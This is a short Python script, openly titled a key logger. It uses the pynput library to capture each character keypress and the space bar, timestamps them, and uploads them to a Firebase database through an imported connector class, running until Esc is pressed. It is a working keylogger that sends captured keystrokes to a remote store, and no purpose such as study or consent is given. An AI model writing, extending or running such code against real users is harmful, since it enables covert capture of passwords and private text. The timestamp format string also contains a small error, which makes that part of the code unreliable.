from pynput import keyboard
import firebaseConnector
from datetime import datetime

print("Starting Key Logger Program")
print("----------------------------------")

# Initialise Connector Class
firebaseConnector = firebaseConnector.FirebaseConnector()

# Stores Key Press and Timestamp
def storeKeyPress(keyString) :
    keyPressTime = datetime.now().strftime("%d-%m-%Y_%H:%M%:%S")
    # Call keypress function
    firebaseConnector.storeKeypressData({"keyPressed": keyString, "timeStamp": keyPressTime})

# On Key Press Function
def on_press(key):
    try:
        print(key.char + " Pressed")
        storeKeyPress(key.char)
    except AttributeError:
        print('special key {0} pressed'.format(
            key))
        # Want to register space as will be important
        if(format(key) == "Key.space"):
            storeKeyPress("Space")

        # TODO: If key is backspace we want to remove items from buffer 

# On Key Release Function
def on_release(key):
    try:
        print(key.char + " Released")
    except AttributeError:
        print('special key {0} pressed'.format(
            key))
        if key == keyboard.Key.esc:
            # Stop listener
            return False




# Collect events until released
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()
